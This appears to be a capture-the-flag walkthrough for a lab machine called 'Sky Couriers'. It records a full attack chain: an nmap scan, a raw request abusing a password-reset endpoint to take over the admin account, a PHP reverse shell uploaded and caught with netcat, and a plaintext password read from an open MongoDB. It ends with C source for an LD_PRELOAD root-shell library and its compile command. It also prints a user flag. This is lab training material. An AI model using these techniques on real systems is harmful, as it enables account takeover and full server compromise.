@@ -1,0 +1,206 @@
+Main IP :: 10.48.182.250
+
+
+So we start with full scan for ports.
+Nmap scan report for 10.48.182.250
+Host is up (0.27s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:80:08:ea:4e:91:23:07:20:28:60:68:26:ee:76:1d (RSA)
+|   256 ba:b3:91:7b:5d:83:bc:a4:3b:b6:8a:92:b3:7e:98:ed (ECDSA)
+|_  256 71:b0:e8:fc:d9:b9:9a:fe:84:f8:15:22:58:01:ac:47 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
+|_http-title: Sky Couriers
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+We find this much of information as we can.
+So we can move to this all.
+
+I tried fuzzing, directory crawling but nothing much more.
+
+So i just logged into the administration page by registering new id's and  did all again but still  nothing realized it is using /v2/ tried API logics but still not effective.
+
+So trying new things again.
+/v2/ResetUser.php like we have this and when we read much about dashboard we can see the admin id and will try to reset it using this.
+
+http://10.48.182.250/v2/profile.php from this section at bottom we will see admin email -> admin@sky.thm
+
+
+POST /v2/lostpassword.php HTTP/1.1
+Host: 10.48.182.250
+Content-Length: 544
+Cache-Control: max-age=0
+Accept-Language: en-GB,en;q=0.9
+Origin: http://10.48.182.250
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNxHJSrCOJIi8GeOB
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.48.182.250/v2/ResetUser.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=osj2kmj34n6c1118b5abtuhvca; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
+Connection: keep-alive
+
+------WebKitFormBoundaryNxHJSrCOJIi8GeOB
+Content-Disposition: form-data; name="uname"
+
+admin@sky.thm
+------WebKitFormBoundaryNxHJSrCOJIi8GeOB
+Content-Disposition: form-data; name="npass"
+
+123456
+------WebKitFormBoundaryNxHJSrCOJIi8GeOB
+Content-Disposition: form-data; name="cpass"
+
+123456
+------WebKitFormBoundaryNxHJSrCOJIi8GeOB
+Content-Disposition: form-data; name="ci_csrf_token"
+
+
+------WebKitFormBoundaryNxHJSrCOJIi8GeOB
+Content-Disposition: form-data; name="send"
+
+Submit
+------WebKitFormBoundaryNxHJSrCOJIi8GeOB--
+
+Changed it over here and tried.
+
+Also reading source code we find a hidden endpoint 	
+		</form>
+	</div>
+</div>	
+<!-- /v2/profileimages/ -->
+<script type="text/javascript">
+        function showtab(tab){
+          console.log(tab);
+          if(tab == 'new_task'){
+            $('#new_task').css('display','block');
+                        
+So if anything uploaded as image we can get it through this part so let's upload a reverse shell php there and get the shell.'
+
+       nc -lvnp 4444        
+Listening on 0.0.0.0 4444
+Connection received on 10.48.182.250 56464
+Linux ip-10-48-182-250 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 09:19:15 up 56 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+as soon as we call from url we  used reverse shell from pentest monkey.
+
+                  
+So with this we get the user.txt
+63191e4ece37523c9fe6bb62a5e64d45
+
+
+Now moving to the root.txt
+
+PRIVILEDGE ESCALATION TIME:
+
+www-data@ip-10-48-182-250:/home/webdeveloper$ ss -tulnp
+Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
+udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
+udp   UNCONN 0      0      10.48.182.250%eth0:68           0.0.0.0:*            
+tcp   LISTEN 0      511             127.0.0.1:9000         0.0.0.0:*            
+tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
+tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
+tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
+tcp   LISTEN 0      4096            127.0.0.1:27017        0.0.0.0:*            
+tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
+tcp   LISTEN 0      511                     *:80                 *:*            
+tcp   LISTEN 0      128                  [::]:22              [::]:*        
+
+So we see this we are going to go with multiple open ports like 33060 and 27017 mongodb 
+
+Let's try for mongo db right for us. Read from here https://www.mongodb.com/docs/manual/reference/default-mongodb-port/
+
+also lets connect with it.
+
+www-data@ip-10-48-182-250:/home/webdeveloper$ mongo
+MongoDB shell version v4.4.29
+connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
+Implicit session: session { "id" : UUID("e77e3765-4e50-4635-88c7-e7c9aaecd490") }
+MongoDB server version: 4.4.29
+Welcome to the MongoDB shell.
+For interactive help, type "help".
+For more comprehensive documentation, see
+        https://docs.mongodb.com/
+Questions? Try the MongoDB Developer Community Forums
+        https://community.mongodb.com
+---
+The server generated these startup warnings when booting: 
+        2026-05-11T08:23:10.955+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
+        2026-05-11T08:23:12.709+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
+---
+> show dbs
+admin   0.000GB
+backup  0.000GB
+config  0.000GB
+local   0.000GB
+
+currently there is nothing which we can see let's check if it has backup in here that we can try for.
+
+show dbs
+admin   0.000GB
+backup  0.000GB
+config  0.000GB
+local   0.000GB
+> use backup;
+switched to db backup
+> show collection;
+uncaught exception: Error: don't know how to show [collection] :
+shellHelper.show@src/mongo/shell/utils.js:1145:11
+shellHelper@src/mongo/shell/utils.js:819:15
+@(shellhelp2):1:1
+> show collections;
+collection
+user
+> db.user.find()
+{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
+{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
+{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
+{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
+{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
+> 
+
+So with this we can escalate to webdeveloper.
+
+And for more stability we switched to ssh.
+
+$ sudo -l
+Matching Defaults entries for webdeveloper on ip-10-48-182-250:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
+
+User webdeveloper may run the following commands on ip-10-48-182-250:
+    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+webdeveloper@ip-10-48-182-250:~$ 
+
+Now we can see about LD_PRELOAD which is a C lang binary which can be use to share libraries amongst the system.
+
+Now let's write shell code for root user in c which will save as shell.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/bash");
+}
+
+now save this and compile it.
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+
